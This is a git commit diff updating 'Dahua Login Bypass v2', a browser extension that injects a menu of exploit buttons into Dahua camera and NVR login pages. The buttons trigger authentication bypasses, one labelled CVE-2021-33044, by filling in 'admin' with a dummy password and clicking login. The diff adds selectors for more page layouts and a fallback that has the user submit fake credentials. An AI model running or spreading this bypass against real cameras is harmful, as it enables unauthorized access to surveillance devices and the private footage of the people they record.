e0b4f220cb088e69fafc4d10fb27e98d86b6ac9a
bp2008 <bp2008@users.noreply.github.com>
2021-10-12 12:58:43 -0600

    Update to v2 which should handle some NVRs, and also work on unrecognized pages simply by asking the user to perform the login.

--- background.js
+++ background.js
@@ -1,23 +1,65 @@
 async function loginBypass()
 {
-	if (window.bypassLoaded)
-		return;
-	window.bypassLoaded = true;
-	let allowed = false;
-	if (document.getElementById("login_user") && document.getElementById("login_psw"))
-		allowed = true;
-	if (!allowed)
+	function HtmlAttributeEncode(str)
 	{
-		if (confirm("This page was not identified as a Dahua camera login page. Attempt login anyway?"))
-			allowed = true;
+		let sb = [];
+		for (let i = 0; i < str.length; i++)
+			switch (str.charAt(i))
+			{
+				case '"':
+					sb.push("&quot;");
+					break;
+				case '\'':
+					sb.push("&#39;");
+					break;
+				case '&':
+					sb.push("&amp;");
+					break;
+				case '<':
+					sb.push("&lt;");
+					break;
+				case '>':
+					sb.push("&gt;");
+					break;
+				default:
+					sb.push(str.charAt(i));
+					break;
+			}
+		return sb.join('');
 	}
-	if (!allowed)
-		return;
 
-	let hackMenu = '<div style="margin-bottom: 10px; font-size: 18px;">Dahua Login Bypass &#10024;</div>';
-	hackMenu += '<div style="margin-bottom: 10px; font-size: 12px;">Try a button. If it does not work, reload the page and try the other button.</div>';
-	hackMenu += '<div style="margin-bottom: 10px; font-size: 12px;">Method 1 should work on most cameras that have not been updated after Sept 2021.</div>';
-	hackMenu += '<div style="margin-bottom: 10px; font-size: 12px;">Method 2 did not work for me in testing but may work for you if firmware is older than beginning/mid 2020.</div>';
+
+	let allSelectorSets = [
+		{ user: '#login_user', pass: '#login_psw', login: 'a[btn-for="onLogin"]' },
+		{ user: '#loginUsername-inputEl', pass: '#loginPassword-inputEl', login: '#loginButton' }
+	];
+	let pageSelectors = null;
+	for (let i = 0; i < allSelectorSets.length; i++)
+	{
+		let s = allSelectorSets[i];
+		if (document.querySelector(s.user) && document.querySelector(s.pass) && document.querySelector(s.login))
+		{
+			pageSelectors = s;
+			break;
+		}
+	}
+	if (!pageSelectors)
+	{
+		if (!confirm("This page was not identified as a Dahua login page. Run Login Bypass script anyway?"))
+			return;
+	}
+
+	if (window.bypassLoaded)
+	{
+		alert('Dahua Login Bypass has already been loaded on this page. Please reload the page if you want to try again.');
+		return;
+	}
+	window.bypassLoaded = true;
+
+	let hackMenu = '<div style="margin-bottom: 10px; font-size: 18px;">Dahua Login Bypass v2 &#10024;</div>';
+	hackMenu += '<div style="margin-bottom: 10px;">Try a button. If it does not work, reload the page and try the other button.</div>';
+	hackMenu += '<div style="margin-bottom: 10px;">Method 1 should work on most cameras that have not been updated after Sept 2021.</div>';
+	hackMenu += '<div style="margin-bottom: 10px;">Method 2 did not work for me in testing but may work for you if firmware is older than beginning/mid 2020.</div>';
 	hackMenu += '<div>';
 
 	hackMenu += '<input type="button" id="dlb_method_1" class="u-button fn-width80" value="Method 1" title="CVE-2021-33044" onclick="'
@@ -44,11 +86,16 @@ async function loginBypass()
 		+ '   return extended;'
 		+ ' } '
 		+ '}; '
-		+ 'document.getElementById(&quot;login_user&quot;).value = &quot;admin&quot;; '
-		+ 'document.getElementById(&quot;login_psw&quot;).value = &quot;Not Used&quot;; '
-		+ 'document.querySelector(\'a[btn-for=&quot;onLogin&quot;]\').click(); '
-		+ 'document.getElementById(&quot;dlb_method_1&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
-		+ 'document.getElementById(&quot;dlb_method_2&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
+		+ (pageSelectors ? (''
+			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.user) + '\').value = &quot;admin&quot;; '
+			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.pass) + '\').value = &quot;Not Used&quot;; '
+			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.login) + '\').click(); '
+			+ 'document.querySelector(\'#dlb_menu\').innerText = \'Bypass Method 1 Enabled\'; '
+		) : (''
+			+ 'document.querySelector(\'#dlb_menu\').parentNode.removeChild(document.querySelector(\'#dlb_menu\')); '
+			+ 'alert(\'Method 1 Enabled. Please attempt to log in now using any fake credentials.\'); '
+			+ '')
+		)
 		+ '}'
 		+ '" />';
 
@@ -80,17 +127,24 @@ async function loginBypass()
 		+ '   return extended;'
 		+ ' } '
 		+ '}; '
-		+ 'document.getElementById(&quot;login_user&quot;).value = &quot;admin&quot;; '
-		+ 'document.getElementById(&quot;login_psw&quot;).value = &quot;Not Used&quot;; '
-		+ 'document.querySelector(\'a[btn-for=&quot;onLogin&quot;]\').click(); '
-		+ 'document.getElementById(&quot;dlb_method_1&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
-		+ 'document.getElementById(&quot;dlb_method_2&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
+		+ (pageSelectors ? (''
+			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.user) + '\').value = &quot;admin&quot;; '
+			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.pass) + '\').value = &quot;Not Used&quot;; '
+			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.login) + '\').click(); '
+			+ 'document.querySelector(\'#dlb_menu\').innerText = \'Bypass Method 2 Enabled\'; '
+		) : (''
+			+ 'document.querySelector(\'#dlb_menu\').parentNode.removeChild(document.querySelector(\'#dlb_menu\')); '
+			+ 'alert(\'Method 2 Enabled. Please attempt to log in now using any fake credentials.\'); '
+			+ '')
+		)
 		+ '}'
 		+ '" />';
 
 	hackMenu += '</div>';
 
 	let div = document.createElement('div');
+	div.id = "dlb_menu";
+	div.style.fontSize = '12px';
 	div.style.marginTop = '10px';
 	div.style.padding = '20px';
 	div.style.backgroundColor = '#FFFFFF';
@@ -101,7 +155,16 @@ async function loginBypass()
 	div.style.position = 'relative';
 	div.style.left = '-72px';
 	div.innerHTML = hackMenu;
-	document.querySelector('a[btn-for="onLogin"]').parentNode.appendChild(div);
+	if (pageSelectors)
+		document.querySelector(pageSelectors.login).parentNode.appendChild(div);
+	else
+	{
+		div.style.position = 'absolute';
+		div.style.top = '0px';
+		div.style.left = '0px';
+
+		document.body.appendChild(div);
+	}
 }
 chrome.action.onClicked.addListener(tab =>
 {
